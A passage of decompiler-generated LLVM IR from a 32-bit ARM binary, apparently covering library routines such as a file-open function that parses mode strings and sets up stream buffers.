  %v3_14c0c = inttoptr i32 %v2_14c0c to i32*
  %v4_14c0c = load i32, i32* %v3_14c0c, align 4
  %v1_14c10 = inttoptr i32 %v4_14c0c to i32*
  %v2_14c10 = load i32, i32* %v1_14c10, align 4
  %v1_14c18 = add i32 %v2_14c10, 1
  %v2_14c1c = add i32 %v0_14c0c, 24
  %v3_14c1c = inttoptr i32 %v2_14c1c to i32*
  %v4_14c1c = load i32, i32* %v3_14c1c, align 4
  store i32 %v4_14c1c, i32* @r4, align 4
  store i32 %v1_14c18, i32* %v1_14c10, align 4
  call void @__pseudo_branch(i32 %v4_14c1c)
  %v0_14c34 = load i32, i32* @r5, align 4
  %v1_14c34 = inttoptr i32 %v0_14c34 to i16*
  %v2_14c34 = load i16, i16* %v1_14c34, align 2
  %v1_14c38 = and i16 %v2_14c34, 24576
  %v1_14c3c = or i16 %v1_14c38, 48
  %v0_14c40 = load i32, i32* %sb.global-to-local, align 4
  %v2_14c40 = icmp eq i32 %v0_14c40, 0
  store i16 %v1_14c3c, i16* %v1_14c34, align 2
  br i1 %v2_14c40, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_14c54 = xor i1 %v2_14c40, true
  call void @__pseudo_cond_branch(i1 %v2_14c54, i32 %v4_14c1c)
  %v0_14c58 = load i32, i32* @r5, align 4
  %v1_14c58 = inttoptr i32 %v0_14c58 to i16*
  %v2_14c58 = load i16, i16* %v1_14c58, align 2
  %v1_14c5c = and i16 %v2_14c58, 16384
  %v2_14c5c = icmp eq i16 %v1_14c5c, 0
  br i1 %v2_14c5c, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_14c64 = xor i1 %v2_14c5c, true
  call void @__pseudo_cond_branch(i1 %v1_14c64, i32 ptrtoint (i32* @global_var_12da0.21 to i32))
  %v2_14c70 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_14c70)
  call void @__pseudo_branch(i32 %v4_14bfc)
  %v0_14c90 = load i32, i32* @r6, align 4
  %v2_14c90 = add i32 %v0_14c90, 48
  %v3_14c90 = inttoptr i32 %v2_14c90 to i32*
  %v4_14c90 = load i32, i32* %v3_14c90, align 4
  %v1_14c94 = inttoptr i32 %v4_14c90 to i32*
  %v2_14c94 = load i32, i32* %v1_14c94, align 4
  %v1_14c98 = add i32 %v2_14c94, 1
  store i32 %v1_14c98, i32* %v1_14c94, align 4
  call void @__pseudo_branch(i32 %v4_14c1c)
  %v0_14cb0 = call i32 @function_15344()
  %v0_14cb4 = load i32, i32* %sl.global-to-local, align 4
  %v2_14cbc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14cbc, i32* @r4, align 4
  store i32 %v6_14b30, i32* @r5, align 4
  store i32 %v9_14b30, i32* @r6, align 4
  store i32 %v12_14b30, i32* @r7, align 4
  ret i32 %v0_14cb4

; uselistorder directives
  uselistorder i1 %v2_14c5c, { 1, 0 }
  uselistorder i32 %v4_14c1c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_14b34, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32 (i32)* @function_1130c, { 8, 29, 28, 33, 32, 27, 31, 30, 26, 25, 19, 24, 23, 22, 21, 20, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14b90, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_14cc8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14cc8:
  %v0_14cc8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14cc8, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_14cc8
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14cc8, %bb
  %v10_14ce0 = phi i32 [ %arg1, %dec_label_pc_14cc8 ], [ 0, %bb ]
  ret i32 %v10_14ce0

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_14ce4() local_unnamed_addr {
dec_label_pc_14ce4:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_14cf4 = call i32 @function_14d04()
  ret i32 %v0_14cf4
}

define i32 @function_14d04() local_unnamed_addr {
dec_label_pc_14d04:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14d04 = load i32, i32* @r4, align 4
  store i32 %v3_14d04, i32* %stack_var_-36, align 4
  %v6_14d04 = load i32, i32* @r5, align 4
  %v9_14d04 = load i32, i32* @r6, align 4
  %v18_14d04 = load i32, i32* @sb, align 4
  %v24_14d04 = load i32, i32* @fp, align 4
  %v0_14d08 = load i32, i32* @r1, align 4
  %v1_14d08 = inttoptr i32 %v0_14d08 to i8*
  %v2_14d08 = load i8, i8* %v1_14d08, align 1
  %v3_14d08 = zext i8 %v2_14d08 to i32
  store i32 %v3_14d08, i32* @ip, align 4
  %v7_14d10 = icmp eq i8 %v2_14d08, 114
  store i32 126992, i32* @fp, align 4
  %v2_14d18 = ptrtoint i32* %stack_var_-72 to i32
  %v0_14d1c = load i32, i32* @r0, align 4
  store i32 %v0_14d1c, i32* @r6, align 4
  %v0_14d20 = load i32, i32* @r2, align 4
  store i32 %v0_14d20, i32* @sb, align 4
  %v0_14d24 = load i32, i32* @r3, align 4
  store i32 %v0_14d24, i32* @r5, align 4
  br i1 %v7_14d10, label %dec_label_pc_14d70, label %dec_label_pc_14d2c

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14d04
  %v7_14d2c = icmp eq i8 %v2_14d08, 119
  br i1 %v7_14d2c, label %bb, label %dec_label_pc_14d38

bb:                                               ; preds = %dec_label_pc_14d2c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_14d74

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14d2c
  %v7_14d38 = icmp eq i8 %v2_14d08, 97
  br i1 %v7_14d38, label %bb32, label %dec_label_pc_14d44

bb32:                                             ; preds = %dec_label_pc_14d38
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_14d74

dec_label_pc_14d44:                               ; preds = %dec_label_pc_14d38, %dec_label_pc_14df8, %dec_label_pc_14dcc
  %v0_14d44 = call i32 @function_11734()
  store i32 %v0_14d44, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_14d4c = load i32, i32* @sb, align 4
  %v2_14d4c = icmp eq i32 %v0_14d4c, 0
  %v2_14d50 = inttoptr i32 %v0_14d44 to i32*
  store i32 22, i32* %v2_14d50, align 4
  br i1 %v2_14d4c, label %dec_label_pc_14fc4, label %dec_label_pc_14d58

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14e1c._crit_edge, %dec_label_pc_14d44
  %v0_14d58 = load i32, i32* @sb, align 4
  %v1_14d58 = inttoptr i32 %v0_14d58 to i16*
  %v2_14d58 = load i16, i16* %v1_14d58, align 2
  %v3_14d58 = zext i16 %v2_14d58 to i32
  store i32 %v3_14d58, i32* %r3.global-to-local, align 4
  %v1_14d5c = and i32 %v3_14d58, 8192
  %v2_14d5c = icmp eq i32 %v1_14d5c, 0
  br i1 %v2_14d5c, label %dec_label_pc_14fc4, label %dec_label_pc_14d64

dec_label_pc_14d64:                               ; preds = %dec_label_pc_14d58
  store i32 %v0_14d58, i32* @r0, align 4
  %v0_14d68 = call i32 @function_12da0()
  store i32 %v0_14d68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14fc4

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d04
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14d74

dec_label_pc_14d74:                               ; preds = %bb, %bb32, %dec_label_pc_14d70
  %v1_14d8c = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_14d70 ]
  %v1_14d74 = add i32 %v0_14d08, 1
  %v2_14d74 = inttoptr i32 %v1_14d74 to i8*
  %v3_14d74 = load i8, i8* %v2_14d74, align 1
  %v7_14d78 = icmp eq i8 %v3_14d74, 98
  %v1_14d74.v0_14d08 = select i1 %v7_14d78, i32 %v1_14d74, i32 %v0_14d08
  store i32 %v1_14d74.v0_14d08, i32* %r3.global-to-local, align 4
  %v1_14d84 = add i32 %v1_14d74.v0_14d08, 1
  %v2_14d84 = inttoptr i32 %v1_14d84 to i8*
  %v3_14d84 = load i8, i8* %v2_14d84, align 1
  %v4_14d84 = zext i8 %v3_14d84 to i32
  store i32 %v4_14d84, i32* @r3, align 4
  %v7_14d88 = icmp eq i8 %v3_14d84, 43
  br i1 %v7_14d88, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_14d74
  store i32 %v1_14d8c, i32* @r3, align 4
  %v2_14d90 = add nuw nsw i32 %v1_14d8c, 1
  store i32 %v2_14d90, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14d74, %bb35
  %v2_14d94 = icmp eq i32 %v0_14d20, 0
  br i1 %v2_14d94, label %dec_label_pc_14d9c, label %dec_label_pc_14dc4

dec_label_pc_14d9c:                               ; preds = %.thread3
  store i32 80, i32* @r0, align 4
  %v0_14da0 = call i32 @function_11d34()
  store i32 %v0_14da0, i32* %r0.global-to-local, align 4
  store i32 %v0_14da0, i32* @sb, align 4
  %v3_14da4 = icmp eq i32 %v0_14da0, 0
  br i1 %v3_14da4, label %dec_label_pc_14fc8, label %dec_label_pc_14dac

dec_label_pc_14dac:                               ; preds = %dec_label_pc_14d9c
  %v2_14db0 = add i32 %v0_14da0, 8
  %v3_14db0 = inttoptr i32 %v2_14db0 to i32*
  store i32 0, i32* %v3_14db0, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_14db8 = load i32, i32* @sb, align 4
  %v3_14db8 = inttoptr i32 %v2_14db8 to i16*
  store i16 8192, i16* %v3_14db8, align 2
  %v0_14dbc = load i32, i32* @sb, align 4
  %v1_14dbc = add i32 %v0_14dbc, 56
  store i32 %v1_14dbc, i32* @r0, align 4
  %v1_14dc0 = call i32 @function_15074(i32 %v1_14dbc)
  store i32 %v1_14dc0, i32* %r0.global-to-local, align 4
  %v0_14dc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14dc4

dec_label_pc_14dc4:                               ; preds = %.thread3, %dec_label_pc_14dac
  %v0_14e1c = phi i32 [ %v0_14d24, %.thread3 ], [ %v0_14dc4.pre, %dec_label_pc_14dac ]
  %v1_14dc4 = icmp slt i32 %v0_14e1c, 0
  br i1 %v1_14dc4, label %dec_label_pc_14e1c, label %dec_label_pc_14dcc

dec_label_pc_14dcc:                               ; preds = %dec_label_pc_14dc4
  %v0_14dd0 = load i32, i32* @r4, align 4
  %v2_14dd0 = and i32 %v0_14dd0, ptrtoint (i32* @global_var_20003.504 to i32)
  %v1_14dd4 = or i32 %v2_14dd0, 1
  store i32 %v1_14dd4, i32* %r2.global-to-local, align 4
  %v0_14dd8 = load i32, i32* @r6, align 4
  %v1_14dd8 = add i32 %v0_14dd8, 1
  %v2_14ddc = and i32 %v1_14dd8, %v1_14dd4
  store i32 %v2_14ddc, i32* %r3.global-to-local, align 4
  %v9_14de0 = icmp eq i32 %v2_14ddc, %v1_14dd4
  %v1_14de4 = load i32, i32* @sb, align 4
  %v2_14de4 = add i32 %v1_14de4, 4
  %v3_14de4 = inttoptr i32 %v2_14de4 to i32*
  store i32 %v0_14e1c, i32* %v3_14de4, align 4
  br i1 %v9_14de0, label %dec_label_pc_14dec, label %dec_label_pc_14d44

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14dcc
  %v0_14dec = load i32, i32* @r4, align 4
  %v1_14dec = load i32, i32* @r6, align 4
  %v2_14dec = sub i32 -1, %v1_14dec
  %v3_14dec = and i32 %v0_14dec, %v2_14dec
  store i32 %v3_14dec, i32* @r3, align 4
  %v1_14df0 = and i32 %v3_14dec, 1024
  %v2_14df0 = icmp eq i32 %v1_14df0, 0
  br i1 %v2_14df0, label %dec_label_pc_14e10, label %dec_label_pc_14df8

dec_label_pc_14df8:                               ; preds = %dec_label_pc_14dec
  %v0_14df8 = load i32, i32* @r5, align 4
  store i32 %v0_14df8, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_14e04 = call i32 @function_11140(i32 %v0_14df8, i32 4)
  store i32 %v2_14e04, i32* %r0.global-to-local, align 4
  %v2_14e08 = icmp eq i32 %v2_14e04, 0
  br i1 %v2_14e08, label %dec_label_pc_14df8.dec_label_pc_14e10_crit_edge, label %dec_label_pc_14d44

dec_label_pc_14df8.dec_label_pc_14e10_crit_edge:  ; preds = %dec_label_pc_14df8
  %v0_14e10.pre = load i32, i32* @r6, align 4
  %v0_14e14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14e10

dec_label_pc_14e10:                               ; preds = %dec_label_pc_14df8.dec_label_pc_14e10_crit_edge, %dec_label_pc_14dec
  %v0_14e14 = phi i32 [ %v0_14e14.pre, %dec_label_pc_14df8.dec_label_pc_14e10_crit_edge ], [ %v0_14dec, %dec_label_pc_14dec ]
  %v0_14e10 = phi i32 [ %v0_14e10.pre, %dec_label_pc_14df8.dec_label_pc_14e10_crit_edge ], [ %v1_14dec, %dec_label_pc_14dec ]
  %v1_14e10 = and i32 %v0_14e10, 131072
  store i32 %v1_14e10, i32* %r3.global-to-local, align 4
  %v2_14e14 = or i32 %v1_14e10, %v0_14e14
  store i32 %v2_14e14, i32* @r4, align 4
  br label %dec_label_pc_14e40

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14dc4
  %v7_14e1c = icmp eq i32 %v0_14e1c, -1
  %v0_14e28.pre = load i32, i32* @r4, align 4
  br i1 %v7_14e1c, label %dec_label_pc_14e1c._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_14e1c
  %v2_14e20 = or i32 %v0_14e28.pre, ptrtoint (i32* @global_var_20000.505 to i32)
  store i32 %v2_14e20, i32* @r4, align 4
  br label %dec_label_pc_14e1c._crit_edge

dec_label_pc_14e1c._crit_edge:                    ; preds = %dec_label_pc_14e1c, %bb36
  %v0_14e28 = phi i32 [ %v2_14e20, %bb36 ], [ %v0_14e28.pre, %dec_label_pc_14e1c ]
  %v0_14e24 = load i32, i32* @r6, align 4
  store i32 %v0_14e24, i32* %r0.global-to-local, align 4
  store i32 %v0_14e28, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_14e30 = call i32 @function_10f18(i32 %v0_14e24, i32 %v0_14e28)
  store i32 %v2_14e30, i32* %r0.global-to-local, align 4
  %v1_14e34 = icmp slt i32 %v2_14e30, 0
  %v1_14e38 = load i32, i32* @sb, align 4
  %v2_14e38 = add i32 %v1_14e38, 4
  %v3_14e38 = inttoptr i32 %v2_14e38 to i32*
  store i32 %v2_14e30, i32* %v3_14e38, align 4
  br i1 %v1_14e34, label %dec_label_pc_14d58, label %.dec_label_pc_14e40_crit_edge

.dec_label_pc_14e40_crit_edge:                    ; preds = %dec_label_pc_14e1c._crit_edge
  %v0_14e44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14e40

dec_label_pc_14e40:                               ; preds = %.dec_label_pc_14e40_crit_edge, %dec_label_pc_14e10
  %v0_14e5c = phi i32 [ %v0_14e44.pre, %.dec_label_pc_14e40_crit_edge ], [ %v2_14e14, %dec_label_pc_14e10 ]
  %v0_14e40 = load i32, i32* @sb, align 4
  %v1_14e40 = inttoptr i32 %v0_14e40 to i16*
  %v2_14e40 = load i16, i16* %v1_14e40, align 2
  %v3_14e40 = zext i16 %v2_14e40 to i32
  %v1_14e44 = urem i32 %v0_14e5c, 4
  %v1_14e48 = and i32 %v0_14e5c, 1024
  %v1_14e4c = and i32 %v3_14e40, 8192
  %v1_14e50 = add nuw nsw i32 %v1_14e44, 1
  %v2_14e54 = or i32 %v1_14e4c, %v1_14e48
  store i32 %v2_14e54, i32* %r3.global-to-local, align 4
  %v1_14e58 = xor i32 %v1_14e50, 3
  store i32 %v1_14e58, i32* %r1.global-to-local, align 4
  %v1_14e5c = and i32 %v0_14e5c, ptrtoint (i32* @global_var_20000.505 to i32)
  store i32 %v1_14e5c, i32* %r2.global-to-local, align 4
  %v2_14e5c = icmp eq i32 %v1_14e5c, 0
  %v1_14e60 = add i32 %v0_14e40, 4
  %v2_14e60 = inttoptr i32 %v1_14e60 to i32*
  %v3_14e60 = load i32, i32* %v2_14e60, align 4
  store i32 %v3_14e60, i32* @r5, align 4
  br i1 %v2_14e5c, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_14e40
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_14e40, %bb37
  %v0_14e6c = phi i32 [ 0, %dec_label_pc_14e40 ], [ 32768, %bb37 ]
  %v4_14e68 = mul nuw nsw i32 %v1_14e58, 16
  %v5_14e68 = or i32 %v2_14e54, %v4_14e68
  store i32 %v5_14e68, i32* %r3.global-to-local, align 4
  %v2_14e6c = or i32 %v0_14e6c, %v5_14e68
  store i32 %v2_14e6c, i32* %r2.global-to-local, align 4
  %v8_14e70 = icmp eq i32 %v3_14e60, 2147483647
  %v1_14e74 = trunc i32 %v2_14e6c to i16
  store i16 %v1_14e74, i16* %v1_14e40, align 2
  br i1 %v8_14e70, label %dec_label_pc_14ea4, label %dec_label_pc_14e7c

dec_label_pc_14e7c:                               ; preds = %bb38
  %v0_14e7c = call i32 @function_11734()
  store i32 %v0_14e7c, i32* @r4, align 4
  %v0_14e84 = load i32, i32* @r5, align 4
  store i32 %v0_14e84, i32* @r0, align 4
  %v1_14e88 = inttoptr i32 %v0_14e7c to i32*
  %v2_14e88 = load i32, i32* %v1_14e88, align 4
  store i32 %v2_14e88, i32* @r5, align 4
  %v1_14e8c = call i32 @function_1607c(i32 %v0_14e84)
  store i32 %v1_14e8c, i32* %r0.global-to-local, align 4
  %v2_14e90 = icmp eq i32 %v1_14e8c, 0
  br i1 %v2_14e90, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_14e7c
  %v1_14e94 = load i32, i32* @sb, align 4
  %v2_14e94 = inttoptr i32 %v1_14e94 to i16*
  %v3_14e94 = load i16, i16* %v2_14e94, align 2
  %v4_14e94 = zext i16 %v3_14e94 to i32
  %v2_14e98 = or i32 %v4_14e94, 256
  store i32 %v2_14e98, i32* %r3.global-to-local, align 4
  %v2_14e9c = trunc i32 %v2_14e98 to i16
  store i16 %v2_14e9c, i16* %v2_14e94, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14e7c, %bb39
  %v0_14ea0 = load i32, i32* @r5, align 4
  %v1_14ea0 = load i32, i32* @r4, align 4
  %v2_14ea0 = inttoptr i32 %v1_14ea0 to i32*
  store i32 %v0_14ea0, i32* %v2_14ea0, align 4
  br label %dec_label_pc_14ea4

dec_label_pc_14ea4:                               ; preds = %bb38, %.thread5
  %v0_14ea4 = load i32, i32* @sb, align 4
  %v1_14ea4 = add i32 %v0_14ea4, 8
  %v2_14ea4 = inttoptr i32 %v1_14ea4 to i32*
  %v3_14ea4 = load i32, i32* %v2_14ea4, align 4
  store i32 %v3_14ea4, i32* %r3.global-to-local, align 4
  %v2_14ea8 = icmp eq i32 %v3_14ea4, 0
  br i1 %v2_14ea8, label %dec_label_pc_14eb0, label %bb40

dec_label_pc_14eb0:                               ; preds = %dec_label_pc_14ea4
  store i32 4096, i32* @r0, align 4
  %v0_14eb4 = call i32 @function_11d34()
  store i32 %v0_14eb4, i32* %r0.global-to-local, align 4
  %v2_14eb8 = icmp eq i32 %v0_14eb4, 0
  %v1_14ec8.pre = load i32, i32* @sb, align 4
  br i1 %v2_14eb8, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14eb0
  %v2_14ebc = inttoptr i32 %v1_14ec8.pre to i16*
  %v3_14ebc = load i16, i16* %v2_14ebc, align 2
  %v4_14ebc = zext i16 %v3_14ebc to i32
  %v2_14ec0 = add i32 %v0_14eb4, 4096
  store i32 %v2_14ec0, i32* %r2.global-to-local, align 4
  %v2_14ec4 = or i32 %v4_14ebc, 16384
  store i32 %v2_14ec4, i32* %r3.global-to-local, align 4
  %v2_14ec8 = add i32 %v1_14ec8.pre, 8
  %v3_14ec8 = inttoptr i32 %v2_14ec8 to i32*
  store i32 %v0_14eb4, i32* %v3_14ec8, align 4
  %v1_14ecc = load i32, i32* %r2.global-to-local, align 4
  %v2_14ecc = load i32, i32* @sb, align 4
  %v3_14ecc = add i32 %v2_14ecc, 12
  %v4_14ecc = inttoptr i32 %v3_14ecc to i32*
  store i32 %v1_14ecc, i32* %v4_14ecc, align 4
  %v1_14ed0 = load i32, i32* %r3.global-to-local, align 4
  %v2_14ed0 = trunc i32 %v1_14ed0 to i16
  %v3_14ed0 = load i32, i32* @sb, align 4
  %v4_14ed0 = inttoptr i32 %v3_14ed0 to i16*
  store i16 %v2_14ed0, i16* %v4_14ed0, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_14eb0
  %v2_14ec819 = add i32 %v1_14ec8.pre, 8
  %v3_14ec820 = inttoptr i32 %v2_14ec819 to i32*
  store i32 0, i32* %v3_14ec820, align 4
  %v2_14ed4 = load i32, i32* @sb, align 4
  %v3_14ed4 = add i32 %v2_14ed4, 12
  %v4_14ed4 = inttoptr i32 %v3_14ed4 to i32*
  store i32 0, i32* %v4_14ed4, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_14ea4, %.thread9
  store i32 56, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_14ee0 = load i32, i32* @fp, align 4
  %v2_14ee0 = add i32 %v0_14ee0, 56
  %v3_14ee0 = inttoptr i32 %v2_14ee0 to i32*
  %v4_14ee0 = load i32, i32* %v3_14ee0, align 4
  store i32 %v4_14ee0, i32* %r3.global-to-local, align 4
  %v2_14ee4 = load i32, i32* @sb, align 4
  %v3_14ee4 = add i32 %v2_14ee4, 2
  %v4_14ee4 = inttoptr i32 %v3_14ee4 to i8*
  store i8 0, i8* %v4_14ee4, align 1
  %v0_14ee8 = load i32, i32* @sb, align 4
  %v1_14ee8 = inttoptr i32 %v0_14ee8 to i16*
  %v2_14ee8 = load i16, i16* %v1_14ee8, align 2
  %v3_14ee8 = zext i16 %v2_14ee8 to i32
  store i32 %v3_14ee8, i32* %r2.global-to-local, align 4
  %v0_14eec = load i32, i32* %r3.global-to-local, align 4
  %v1_14eec = inttoptr i32 %v0_14eec to i32*
  %v2_14eec = load i32, i32* %v1_14eec, align 4
  store i32 %v2_14eec, i32* %r1.global-to-local, align 4
  %v1_14ef0 = add i32 %v0_14ee8, 8
  %v2_14ef0 = inttoptr i32 %v1_14ef0 to i32*
  %v3_14ef0 = load i32, i32* %v2_14ef0, align 4
  store i32 %v3_14ef0, i32* %r3.global-to-local, align 4
  %v1_14ef4 = and i32 %v3_14ee8, 8192
  %v2_14ef4 = icmp eq i32 %v1_14ef4, 0
  %v2_14ef8 = add i32 %v0_14ee8, 20
  %v3_14ef8 = inttoptr i32 %v2_14ef8 to i32*
  store i32 %v3_14ef0, i32* %v3_14ef8, align 4
  %v0_14efc = load i32, i32* %r0.global-to-local, align 4
  %v1_14efc = load i32, i32* @sb, align 4
  %v2_14efc = add i32 %v1_14efc, 44
  %v3_14efc = inttoptr i32 %v2_14efc to i32*
  store i32 %v0_14efc, i32* %v3_14efc, align 4
  %v0_14f00 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f00 = load i32, i32* @sb, align 4
  %v2_14f00 = add i32 %v1_14f00, 52
  %v3_14f00 = inttoptr i32 %v2_14f00 to i32*
  store i32 %v0_14f00, i32* %v3_14f00, align 4
  %v0_14f04 = load i32, i32* %r3.global-to-local, align 4
  %v1_14f04 = load i32, i32* @sb, align 4
  %v2_14f04 = add i32 %v1_14f04, 24
  %v3_14f04 = inttoptr i32 %v2_14f04 to i32*
  store i32 %v0_14f04, i32* %v3_14f04, align 4
  %v0_14f08 = load i32, i32* %r3.global-to-local, align 4
  %v1_14f08 = load i32, i32* @sb, align 4
  %v2_14f08 = add i32 %v1_14f08, 28
  %v3_14f08 = inttoptr i32 %v2_14f08 to i32*
  store i32 %v0_14f08, i32* %v3_14f08, align 4
  %v0_14f0c = load i32, i32* %r3.global-to-local, align 4
  %v1_14f0c = load i32, i32* @sb, align 4
  %v2_14f0c = add i32 %v1_14f0c, 16
  %v3_14f0c = inttoptr i32 %v2_14f0c to i32*
  store i32 %v0_14f0c, i32* %v3_14f0c, align 4
  br i1 %v2_14ef4, label %dec_label_pc_14fc8, label %dec_label_pc_14f14

dec_label_pc_14f14:                               ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_14f18 = load i32, i32* @fp, align 4
  %v2_14f18 = add i32 %v0_14f18, 36
  %v3_14f18 = inttoptr i32 %v2_14f18 to i32*
  %v4_14f18 = load i32, i32* %v3_14f18, align 4
  store i32 %v4_14f18, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_14f20 = add i32 %v0_14f18, 108
  %v3_14f20 = inttoptr i32 %v2_14f20 to i32*
  %v4_14f20 = load i32, i32* %v3_14f20, align 4
  store i32 %v4_14f20, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_14f28 = ptrtoint i32* %stack_var_-56 to i32
  %v2_14f2c = add i32 %v0_14f18, 72
  %v3_14f2c = inttoptr i32 %v2_14f2c to i32*
  %v4_14f2c = load i32, i32* %v3_14f2c, align 4
  store i32 %v4_14f18, i32* %r1.global-to-local, align 4
  store i32 %v4_14f20, i32* %r2.global-to-local, align 4
  store i32 %v2_14f28, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f2c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14f48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14f48, i32* %r0.global-to-local, align 4
  %v0_14f4c = load i32, i32* @fp, align 4
  %v2_14f4c = add i32 %v0_14f4c, 16
  %v3_14f4c = inttoptr i32 %v2_14f4c to i32*
  %v4_14f4c = load i32, i32* %v3_14f4c, align 4
  call void @__pseudo_branch(i32 %v4_14f4c)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_14f5c = load i32, i32* @fp, align 4
  %v2_14f5c = add i32 %v0_14f5c, 96
  %v3_14f5c = inttoptr i32 %v2_14f5c to i32*
  %v4_14f5c = load i32, i32* %v3_14f5c, align 4
  store i32 %v4_14f5c, i32* %r4.global-to-local, align 4
  %v0_14f60 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14f60, i32* %r1.global-to-local, align 4
  store i32 %v4_14f5c, i32* %r2.global-to-local, align 4
  store i32 %v2_14d18, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f2c)
  store i32 %v4_14f5c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f4c)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14f84 = load i32, i32* @fp, align 4
  %v2_14f84 = add i32 %v0_14f84, 44
  %v3_14f84 = inttoptr i32 %v2_14f84 to i32*
  %v4_14f84 = load i32, i32* %v3_14f84, align 4
  store i32 %v4_14f84, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_14f8c = inttoptr i32 %v4_14f84 to i32*
  %v2_14f8c = load i32, i32* %v1_14f8c, align 4
  store i32 %v2_14f8c, i32* %r2.global-to-local, align 4
  store i32 %v2_14d18, i32* %r0.global-to-local, align 4
  %v1_14f94 = load i32, i32* @sb, align 4
  %v2_14f94 = add i32 %v1_14f94, 32
  %v3_14f94 = inttoptr i32 %v2_14f94 to i32*
  store i32 %v2_14f8c, i32* %v3_14f94, align 4
  %v0_14f98 = load i32, i32* @fp, align 4
  %v1_14f98 = load i32, i32* %r3.global-to-local, align 4
  %v2_14f98 = add i32 %v1_14f98, %v0_14f98
  %v3_14f98 = inttoptr i32 %v2_14f98 to i32*
  %v4_14f98 = load i32, i32* %v3_14f98, align 4
  store i32 %v4_14f98, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_14fa0 = load i32, i32* @sb, align 4
  %v1_14fa0 = load i32, i32* @ip, align 4
  %v2_14fa0 = inttoptr i32 %v1_14fa0 to i32*
  store i32 %v0_14fa0, i32* %v2_14fa0, align 4
  call void @__pseudo_branch(i32 %v4_14f98)
  store i32 %v2_14f28, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f98)
  br label %dec_label_pc_14fc8

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14d58, %dec_label_pc_14d44, %dec_label_pc_14d64
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_14fc8

dec_label_pc_14fc8:                               ; preds = %bb40, %dec_label_pc_14d9c, %dec_label_pc_14f14, %dec_label_pc_14fc4
  %v0_14fc8 = load i32, i32* @sb, align 4
  store i32 %v0_14fc8, i32* %r0.global-to-local, align 4
